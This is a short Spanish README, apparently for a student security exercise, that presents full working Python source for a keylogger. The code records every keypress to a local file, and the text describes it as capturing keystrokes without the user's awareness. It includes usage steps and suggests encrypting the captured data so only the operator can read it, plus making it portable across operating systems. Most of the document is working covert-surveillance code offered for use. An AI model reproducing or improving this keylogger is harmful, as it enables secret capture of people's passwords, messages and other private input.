Descripción:
Este programa llamadop keylogger se usa para registrar las telcas que pulsa el usuario sin que el sea consciente de ello.
El código está diseñado para que registre cada pulsación de teclado; después será registrado los datos del teclado en el archivo datos_keylogger.txt. En mi caso he utilizado el 0 para salir del keylogger.

Áreas de mejora
- Seguridad:  no tiene medidas de seguridad. Para que los datos que nos llegan sean más seguros deberiamos de utilizar algun tipo de algoritmo para cifrarlos y solo poder leerlos nosotros.
- Compatibilidad: deberiamos buscar una manera de poner la ruta del archivo para que sea compatible con todos los sistemas operativos. 

¿Cómo utilizarlo?
Simplemente ejecutaremos el archivo keylogger.py y empezaremos a seguir nuestro trabajo de forma normal. Cuando queramos pararlo pulsaremos 0 y veremos como en el archivo datos_keylogger.txt se ha registrado con exito los datos introducidos.

¿Cómo funciona el Keylogger?
#Aquí importamos la librería que necesitamos; keyboard:

import keyboard

#Aquí tenemos la funcion que realiza el proceso de registrar las teclas pulsadas junto con los espacios. 
def onKeyboardEvent(event):
    with open("C:\\Users\\laura\\Desktop\\SI_T5_P1\\datos_keylogger.txt", "a") as file:
        if event.name == "space":
            file.write(" ")
        else:
            file.write(str(event.name))

keyboard.on_press(onKeyboardEvent)
print("Pulsa 0 para salir")
keyboard.wait("0")

